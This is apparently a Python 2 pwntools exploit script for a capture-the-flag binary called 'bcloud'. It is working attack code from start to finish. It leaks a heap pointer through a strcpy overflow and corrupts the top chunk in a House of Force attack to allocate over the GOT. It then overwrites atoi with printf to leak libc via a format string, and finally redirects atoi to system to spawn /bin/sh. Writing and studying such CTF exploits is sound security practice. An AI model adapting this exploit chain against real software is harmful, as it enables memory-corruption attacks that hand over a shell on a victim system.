from pwn import *
import ctypes

heap_leak = "a"
p = None

# you can leak the heap addr off of the stack if u
# make your name exactly 0x40 characters.

# strcpy will keep strcpying, and there's a heap ptr
# right after the name buf


# sometimes the heap addr leaked has a null
# and i was too lazy to parse
#YOLO
while len(heap_leak) != 4:
    if p:
        p.close()
    p = process("./bcloud")

    name = "A"*0x40
    p.recv()
    p.send(name)
    data = p.recv()

    heap_leak = data.split("A"*0x40)[1].split("!")[0]

print "Heap leak good!"
heap_leak = u32(heap_leak)

print "Heap leak:", hex(heap_leak)


# you can corrupt the top chunk if you make org exactly 0x40 chars and
# host exactly 0x40 characters.

# this is because of strcpys, just like the bug above.

org = "B"*0x40
top_chunk_corrupt = p32(0xffffffff)
host = top_chunk_corrupt + "C"*0x3c

wilderness_loc = heap_leak + 196

# i mostly just guessed until i got a chunk malloced on the got
target = 0x0804b020

final_val = ctypes.c_int32(
    target - 8 - wilderness_loc - 4
).value

# https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/

print "final val: ", final_val
print "unsigned: ", ctypes.c_uint32(final_val).value
p.send(org)
p.recv()
p.send(host)
p.recv()

p.sendline("1")
p.recv()

p.sendline(str(final_val))
p.recv()
p.sendline()
p.recv()

# this malloc will point to the .got.plt: 0x804b030
p.sendline("1")
p.recv()
p.sendline("32")
p.recv()
# overwrite atoi with printf
p.sendline("AAAABBBBCCCC" + p32(0x080484d0))
p.recv()
# leak libc with a format string, atoi is called 
# to get your menu option. 
p.sendline("%8x%8x%8x%8x%8x")
data = p.recv()

libc_leak = int(
    data.split("a")[1][0:8],
    16
)

libc_base = libc_leak - 0x49696

print "libc base:", hex(libc_base)

system_addr = libc_base + 241056

# edit atoi's got ptr to point to system
p.sendline("A"*3)
p.sendline("A")

p.sendline("AAAABBBBCCCC" + p32(system_addr))

# when the menu goes to get an option, it will call system
# on your option ;)
p.sendline("/bin/sh")
p.interactive()

